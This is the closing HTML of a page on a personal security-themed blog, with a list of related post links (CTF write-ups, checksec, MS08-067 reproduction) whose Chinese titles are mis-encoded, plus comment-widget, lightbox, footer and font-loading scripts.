<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>ç›¸å…³æ–‡ç« </h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/posts/2025/06/11/checksecinstalldiff.html/><div class=article-image><img src=/posts/2025/06/11/checksecinstalldiff.html/cover.0b47bec42efd62326522dcceec7c0c9f_hu_307eb29a98e42e9d.jpg width=250 height=150 loading=lazy alt="Featured image of post checksecæ¨ªè¡¨æ ¼ä¸æ˜¾ç¤ºæ¶æ„(arch)é—®é¢˜è§£å†³ï¼ˆä¸åŒç‰ˆæœ¬å®‰è£…ï¼‰" data-key=checksecInstallDiff data-hash="md5-C0e+xC79YjJlItzO7HwMnw=="></div><div class=article-details><h2 class=article-title>checksecæ¨ªè¡¨æ ¼ä¸æ˜¾ç¤ºæ¶æ„(arch)é—®é¢˜è§£å†³ï¼ˆä¸åŒç‰ˆæœ¬å®‰è£…ï¼‰</h2></div></a></article><article class=has-image><a href=/posts/2024/11/26/letzreverseit.html/><div class=article-image><img src=/posts/2024/11/26/letzreverseit.html/cover.a51f3d55c8b87ae1eb798ae35be43a02_hu_ea91b000f79a27e4.jpg width=250 height=150 loading=lazy alt="Featured image of post ctf reverseè§£é¢˜+å­¦ä¹ " data-key=letzreverseit data-hash="md5-pR89Vci4euHreYrjW+Q6Ag=="></div><div class=article-details><h2 class=article-title>ctf reverseè§£é¢˜+å­¦ä¹ </h2></div></a></article><article class=has-image><a href=/posts/2024/11/20/ms08-067review-atk.html/><div class=article-image><img src=/posts/2024/11/20/ms08-067review-atk.html/done.2c98c6fe9545be9398f9dacf51ac2466_hu_729a64e7dfa7860e.png width=250 height=150 loading=lazy alt="Featured image of post ã€æ¼æ´ã€‘windowsæ¼æ´MS08-067å¤ç°ä¸æ”»å‡»" data-key=ms08-067review-atk data-hash="md5-LJjG/pVFvpOY+drPUawkZg=="></div><div class=article-details><h2 class=article-title>ã€æ¼æ´ã€‘windowsæ¼æ´MS08-067å¤ç°ä¸æ”»å‡»</h2></div></a></article><article class=has-image><a href=/posts/2024/11/14/web-ctf.html/><div class=article-image><img src=/posts/2024/11/14/web-ctf.html/cover.caaa69c4cd00b265033fd3c5ceb4e8e7_hu_ac0666ffa70324c1.png width=250 height=150 loading=lazy alt="Featured image of post ã€å½’æ¡£ã€‘ctf webç±»è§£å¯†" data-key=web-ctf data-hash="md5-yqppxM0AsmUDP9PFzrTo5w=="></div><div class=article-details><h2 class=article-title>ã€å½’æ¡£ã€‘ctf webç±»è§£å¯†</h2></div></a></article><article class=has-image><a href=/posts/2024/10/31/buuctf-misc.html/><div class=article-image><img src=/posts/2024/10/31/buuctf-misc.html/cover.84ba7b145c4f34398a249d691706685d_hu_edc9e71b4c32ad6.png width=250 height=150 loading=lazy alt="Featured image of post ã€å½’æ¡£ã€‘æ‚é¡¹miscè§£å¯†è®°å½•" data-key=buuctf-misc data-hash="md5-hLp7FFxPNDmKJJ1pFwZoXQ=="></div><div class=article-details><h2 class=article-title>ã€å½’æ¡£ã€‘æ‚é¡¹miscè§£å¯†è®°å½•</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=wuko233/wuko233.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDAxMzU0ODE=" data-category=Announcements data-category-id=DIC_kwDOF9mVOc4CnNtv data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light_high_contrast data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light_high_contrast":"noborder_dark")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2026 wuko's blog</section><section class=powerby>æœ¬ç«™æ€»è®¿é—®é‡<span id=busuanzi_value_site_pv>0</span>æ¬¡<br><a href="https://icp.gov.moe/?keyword=20220237" target=_blank>èŒICPå¤‡20220237å·</a><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><br>ä½¿ç”¨ <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> æ„å»º<br>ä¸»é¢˜ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> ç”± <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> è®¾è®¡</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>